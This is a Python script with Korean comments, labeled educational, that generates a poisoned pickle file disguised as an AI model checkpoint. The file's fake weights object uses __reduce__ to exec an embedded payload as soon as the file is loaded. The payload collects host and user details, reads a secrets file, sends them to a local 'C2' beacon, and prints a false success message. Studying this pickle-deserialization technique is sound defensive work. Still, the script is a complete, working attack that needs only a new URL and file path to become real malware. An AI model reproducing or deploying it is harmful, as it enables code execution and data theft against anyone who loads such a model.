"""
오염된(악성) AI 모델 체크포인트 파일을 만드는 스크립트 (교육용).

배경을 짚고 가면: 많은 AI/딥러닝 생태계(PyTorch 등)는 모델 가중치를
파이썬 pickle 포맷으로 저장하고 불러온다. pickle은 "데이터"뿐 아니라
"이 객체를 만들 때 이 함수를 이 인자로 실행해라"라는 __reduce__ 규칙도
같이 저장할 수 있어서, 악의적으로 만든 .pt/.pkl 파일은 그냥
pickle.load()만 해도 임의 코드 실행(RCE)으로 이어질 수 있다. 실제로
Hugging Face 같은 모델 허브에서 이런 악성 pickle 모델이 여러 번 발견된
적이 있다.

여기서는 그 트릭을 그대로 재현했다. 모델 가중치 객체의 __reduce__가
(exec, (악성코드문자열,))을 돌려주면, pickle.load()가 이 지시를 그대로
따라서 exec(악성코드)를 실행하는 식이다.

실행되는 코드는 완전히 무해하다 - 정찰 정보를 모아서 127.0.0.1로만 beacon을 보낸다.
"""
import pickle
from pathlib import Path

# pickle.load() 시점에 실제로 실행될 코드 (모델 파일 안에 "데이터"로 통째로 들어감).
# -> 즉 공격자는 별도 악성 모듈을 victim PC에 심을 필요조차 없습니다.
PAYLOAD_CODE = """
import json, os, socket, time, urllib.request

def _beacon(payload):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        "http://127.0.0.1:8899/beacon",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=2)
    except Exception as e:
        print("[poisoned-model][sim] C2 연결 실패:", e)

recon = {
    "hostname": socket.gethostname(),
    "user": os.environ.get("USERNAME", "unknown"),
    "cwd": os.getcwd(),
}
secret_preview = None
for _p in ("dummy_secrets.txt", os.path.join("..", "fake_victim", "dummy_secrets.txt")):
    if os.path.exists(_p):
        with open(_p, encoding="utf-8") as _f:
            secret_preview = _f.read()[:40] + "..."
        break

_beacon({
    "event": "pickle_model_load_beacon",
    "vector": "poisoned pickle model (pickle.load on 'pretrained checkpoint')",
    "recon": recon,
    "stolen_preview": secret_preview,
    "ts": time.time(),
})
print("[malicious_model] (겉보기용) 모델 가중치를 성공적으로 불러왔습니다.")
"""


class _FakeModelWeights:
    """pickle이 이 객체를 복원할 때, 저장된 값 대신 아래 함수 호출 결과를 사용하게 만듦."""

    def __reduce__(self):
        # exec()에 globals 딕셔너리를 명시적으로 넘겨야 PAYLOAD_CODE 안에서 정의한
        # 함수(_beacon)가 같은 exec 안에서 import한 이름(json 등)을 찾을 수 있음.
        return (exec, (PAYLOAD_CODE, {}))


def main():
    checkpoint = {
        "model_name": "super-resolution-v2",
        "framework": "toy-framework 0.1",
        "weights": _FakeModelWeights(),  # 겉보기엔 그냥 가중치 텐서 자리
    }
    out_path = Path(__file__).parent / "malicious_model.pkl"
    with open(out_path, "wb") as f:
        pickle.dump(checkpoint, f)
    print(f"생성 완료: {out_path} (겉보기엔 평범한 모델 체크포인트 파일)")


if __name__ == "__main__":
    main()
